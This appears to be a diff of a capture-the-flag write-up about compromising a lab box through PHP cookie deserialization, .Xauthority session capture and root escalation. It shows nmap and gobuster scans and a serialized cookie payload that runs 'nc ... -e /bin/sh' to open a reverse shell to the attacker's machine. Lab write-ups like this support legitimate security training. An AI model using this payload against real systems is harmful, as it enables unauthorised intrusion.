@@ -2,7 +2,7 @@
 
 This medium challenge box employed a variety of attacks and techniques, including a PHP [[Cookie Serialization]] Attack that leveraged the `preferences.php` file to gain a [[Reverse Shell]]. Once access was obtained as the `www-data` user, the `.Xauthority` file was exploited to capture the `vanity` user's graphical session, enabling the extraction of sensitive data through a screenshot that revealed their password. Following this, privilege escalation techniques were utilized to run a script as root without a password, allowing for further access to protected content. 
 
-**Initial [[nmap]] scan**
+**Initial [[Nmap]] scan**
 ```bash
 └─$ nmap -A -sC -p- 192.168.5.103     
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-22 17:56 EDT
@@ -23,7 +23,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 18.20 seconds
 ```
 
-**Using [[gobuster]] we discover `preferences.php`**
+**Using [[Gobuster]] we discover `preferences.php`**
 ```bash
 └─$ gobuster dir -u http://192.168.5.103 -e -r -x html,htm,asp,aspx,jsp,php,cgi,txt,xml -w /usr/share/wordlists/dirb/common.txt
 ===============================================================
@@ -61,7 +61,7 @@ Finished
 
 **Using `Burp Suite` we use the `Proxy` feature to intercept the traffic when we reload the page:**
 ![[Pasted image 20240922160847.png]]
-**On the far right side of the window we can modify the `Decoded from` to gain a [[Reverse Shell]] using a PHP [[Cookie Serialization]] Attack:**
+**On the far right side of the window we can modify the `Decoded from` to gain a [[Netcat Reverse Shells]] using a PHP [[Cookie Serialization]] Attack:**
 
 >O:15:"UserPreferences":2:{s:8:"language";s:31:"nc 192.168.5.10 9999 -e /bin/sh";s:15:"backgroundColor";s:4:"#ddd";}
 
